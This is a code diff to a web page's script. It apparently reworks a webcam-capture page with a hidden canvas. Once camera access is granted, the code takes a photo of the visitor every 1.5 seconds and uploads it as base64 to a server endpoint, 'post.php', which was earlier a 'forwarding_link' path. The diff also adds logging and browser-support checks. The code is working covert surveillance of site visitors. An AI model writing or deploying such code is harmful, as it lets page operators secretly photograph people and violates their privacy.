@@ -20,42 +20,53 @@
 </div>
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 <script>
-    function post(imgdata) {
-        $.ajax({
-            type: 'POST',
-            data: { cat: imgdata },
-            url: 'forwarding_link/post.php',
-            dataType: 'json',
-            async: false,
-            success: function(result) {
-                // Handle the response
-            },
-            error: function() {
-            }
-        });
-    };
-
-    'use strict';
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const errorMsgElement = document.querySelector('span#errorMsg');
-
-    const constraints = {
-        audio: false,
-        video: {
-            facingMode: "user"
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result) {
+            console.log("Image sent successfully!");
+        },
+        error: function(xhr, status, error) {
+            console.error("Error sending image:", error);
         }
-    };
+    });
+};
 
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user"
+    }
+};
+
+// Check for browser support
+if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    console.error("getUserMedia is not supported in this browser.");
+    errorMsgElement.innerHTML = "Your browser does not support camera access.";
+} else {
+    // Access webcam
     async function init() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            console.log("Webcam access granted!");
             handleSuccess(stream);
         } catch (e) {
-            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+            console.error("Webcam access denied:", e);
+            errorMsgElement.innerHTML = `Error accessing camera: ${e.toString()}`;
         }
     }
 
+    // Success
     function handleSuccess(stream) {
         window.stream = stream;
         video.srcObject = stream;
@@ -64,11 +75,14 @@
         setInterval(function() {
             context.drawImage(video, 0, 0, 640, 480);
             var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            console.log("Captured image:", canvasData.substring(0, 50) + "..."); // Log partial image data
             post(canvasData);
         }, 1500);
     }
 
+    // Load init
     init();
+}
 </script>
 <body>
     <center>
